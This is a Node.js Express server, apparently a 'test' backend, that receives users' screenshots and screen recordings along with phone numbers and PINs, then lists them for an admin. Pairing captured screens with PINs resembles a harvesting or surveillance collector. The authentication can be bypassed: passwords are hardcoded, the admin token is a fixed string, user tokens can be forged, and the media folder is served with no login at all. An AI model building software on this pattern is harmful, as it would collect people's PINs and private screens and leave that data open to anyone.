/**
 * Screen Capture Test Server
 * - POST /api/login/user, /api/login/admin
 * - POST /api/upload (screenshots), POST /api/upload/video (video chunks)
 * - GET  /api/screenshots (admin — images + videos)
 */

const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3001;

const SCREENSHOTS_DIR = path.join(__dirname, "screenshots");
const MANIFEST_PATH = path.join(SCREENSHOTS_DIR, "manifest.json");

const USERS = {
  user: { password: "user123", role: "user" },
  demo: { password: "demo123", role: "user" },
};

const ADMINS = {
  admin: { password: "admin123", role: "admin" },
};

if (!fs.existsSync(SCREENSHOTS_DIR)) {
  fs.mkdirSync(SCREENSHOTS_DIR, { recursive: true });
}

if (!fs.existsSync(MANIFEST_PATH)) {
  fs.writeFileSync(MANIFEST_PATH, JSON.stringify([], null, 2));
}

app.use(cors());
app.use(express.json({ limit: "80mb" }));

function readManifest() {
  try {
    return JSON.parse(fs.readFileSync(MANIFEST_PATH, "utf8"));
  } catch {
    return [];
  }
}

function writeManifest(entries) {
  fs.writeFileSync(MANIFEST_PATH, JSON.stringify(entries, null, 2));
}

function parseToken(authHeader) {
  if (!authHeader?.startsWith("Bearer ")) return null;
  const token = authHeader.slice(7);

  if (token === "admin-token") {
    return { role: "admin", username: "admin" };
  }

  const userMatch = token.match(/^user-token-(.+)$/);
  if (userMatch) {
    return { role: "user", username: userMatch[1] };
  }

  return null;
}

function requireAdmin(req, res, next) {
  const session = parseToken(req.headers.authorization);
  if (!session || session.role !== "admin") {
    return res.status(403).json({ success: false, message: "Admin access required" });
  }
  req.session = session;
  next();
}

function requireUser(req, res, next) {
  const session = parseToken(req.headers.authorization);
  if (!session || session.role !== "user") {
    return res.status(403).json({ success: false, message: "User login required" });
  }
  req.session = session;
  next();
}

function addManifestEntry(entry) {
  const manifest = readManifest();
  manifest.unshift(entry);
  writeManifest(manifest);
  return entry;
}

app.post("/api/login/user", (req, res) => {
  const { username, password } = req.body;
  const account = USERS[username];

  if (!account || account.password !== password) {
    return res.status(401).json({ success: false, message: "Invalid username or password" });
  }

  return res.json({
    success: true,
    token: `user-token-${username}`,
    username,
    role: "user",
    message: "User login successful",
  });
});

app.post("/api/login/admin", (req, res) => {
  const { username, password } = req.body;
  const account = ADMINS[username];

  if (!account || account.password !== password) {
    return res.status(401).json({ success: false, message: "Invalid admin credentials" });
  }

  return res.json({
    success: true,
    token: "admin-token",
    username,
    role: "admin",
    message: "Admin login successful",
  });
});

app.post("/api/upload", requireUser, (req, res) => {
  const { image, phone, pin } = req.body;
  const username = req.session.username;

  if (!image || typeof image !== "string") {
    return res.status(400).json({ success: false, message: "Missing image data" });
  }

  const matches = image.match(/^data:image\/png;base64,(.+)$/);
  if (!matches) {
    return res.status(400).json({ success: false, message: "Image must be a PNG data URL" });
  }

  const savedAt = new Date().toISOString();
  const timestamp = savedAt.replace(/[:.]/g, "-");
  const filename = `${username}-${timestamp}.png`;
  const filepath = path.join(SCREENSHOTS_DIR, filename);

  try {
    fs.writeFileSync(filepath, Buffer.from(matches[1], "base64"));

    const entry = addManifestEntry({
      id: `img-${username}-${timestamp}`,
      type: "screenshot",
      filename,
      username,
      phone: phone || null,
      pin: pin || null,
      savedAt,
      url: `/screenshots/${filename}`,
    });

    console.log(`[upload] screenshot ${username} → ${filename}`);
    return res.json({ success: true, ...entry });
  } catch (err) {
    console.error("[upload] Failed:", err);
    return res.status(500).json({ success: false, message: "Failed to save screenshot" });
  }
});

app.post("/api/upload/video", requireUser, (req, res) => {
  const { video, phone, pin } = req.body;
  const username = req.session.username;

  if (!video || typeof video !== "string") {
    return res.status(400).json({ success: false, message: "Missing video data" });
  }

  const matches = video.match(/^data:video\/webm(?:;[^,]+)?;base64,(.+)$/);
  if (!matches) {
    return res.status(400).json({ success: false, message: "Video must be a WebM data URL" });
  }

  const savedAt = new Date().toISOString();
  const timestamp = savedAt.replace(/[:.]/g, "-");
  const filename = `${username}-${timestamp}.webm`;
  const filepath = path.join(SCREENSHOTS_DIR, filename);

  try {
    fs.writeFileSync(filepath, Buffer.from(matches[1], "base64"));

    const entry = addManifestEntry({
      id: `vid-${username}-${timestamp}`,
      type: "video",
      filename,
      username,
      phone: phone || null,
      pin: pin || null,
      savedAt,
      url: `/screenshots/${filename}`,
    });

    console.log(`[upload] video ${username} → ${filename}`);
    return res.json({ success: true, ...entry });
  } catch (err) {
    console.error("[upload] video failed:", err);
    return res.status(500).json({ success: false, message: "Failed to save video" });
  }
});

app.get("/api/screenshots", requireAdmin, (req, res) => {
  let entries = readManifest();

  const filterUser = req.query.username;
  if (filterUser) {
    entries = entries.filter((e) => e.username === filterUser);
  }

  const filterType = req.query.type;
  if (filterType) {
    entries = entries.filter((e) => e.type === filterType);
  }

  res.json({ success: true, screenshots: entries, total: entries.length });
});

app.get("/api/screenshots/users", requireAdmin, (_req, res) => {
  const manifest = readManifest();
  const users = [...new Set(manifest.map((e) => e.username))].sort();
  res.json({ success: true, users });
});

app.use("/screenshots", express.static(SCREENSHOTS_DIR));

app.get("/api/health", (_req, res) => {
  res.json({ status: "ok" });
});

// Production: serve React build from same origin (required for HTTPS + mobile)
const clientDist = path.join(__dirname, "..", "client", "dist");
if (process.env.NODE_ENV === "production" && fs.existsSync(clientDist)) {
  app.use(express.static(clientDist));
  app.get("*", (req, res, next) => {
    if (req.path.startsWith("/api") || req.path.startsWith("/screenshots")) {
      return next();
    }
    res.sendFile(path.join(clientDist, "index.html"));
  });
  console.log(`Serving frontend from ${clientDist}`);
}

app.listen(PORT, () => {
  console.log(`Screen capture server running on http://localhost:${PORT}`);
  console.log(`Media saved to: ${SCREENSHOTS_DIR}`);
});
